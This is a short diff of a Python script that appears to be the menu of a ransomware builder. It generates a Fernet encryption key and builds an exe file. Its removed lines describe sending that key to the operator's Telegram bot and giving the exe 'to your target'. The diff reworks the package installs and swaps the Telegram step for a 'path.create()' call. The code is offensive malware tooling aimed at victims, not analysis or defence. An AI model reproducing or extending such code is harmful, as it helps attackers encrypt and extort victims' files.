@@ -4,13 +4,16 @@ import time
 os.system("cls")
 time.sleep(0.3)
 os.system("pip install --upgrade pip")
-os.system("pip install -r requirements.txt")
+lib = ["cryptography","pyngrok","colorama","requests","json","win10toast","ctypes","getpass"]
+for i in lib:
+    os.system(f"pip install {i}")
 #Finish Install Requirements
 import sys
 from colorama import Fore
 import ToJa
 import banner
 from cryptography.fernet import Fernet
+import path
 
 key2= Fernet.generate_key()
 
@@ -27,14 +30,7 @@ if int(sel) == 1:
 elif int(sel) == 2:
     ToJa.soc()
 elif int(sel) == 3:
-    print(Fore.RED+" [!] "+Fore.BLUE+" This Tool Send The Key Of Encrypt To Your Bot And Make Exe File And You Should Give It To Your Target ")
-    time.sleep(0.3)
-    token = input(Fore.RED+"\n [!] Enter Your Bot Token : ")
-    banner.banner()
-    chat = input(Fore.YELLOW+"\n [!] Enter Your Chat Id In Telegram : ")
-    time.sleep(0.3)
-    ToJa.soc2(token,chat,str(key2))
-    print(Fore.GREEN+"\n [+] "+Fore.BLUE+"The Key Of Encrypt Is Sent To Your Bot! ")
+    path.create()
     print(Fore.GREEN+"\n [*] "+Fore.WHITE+"Please Wait For Building Exe File... \n")
     time.sleep(1)
     ToJa.soc3()
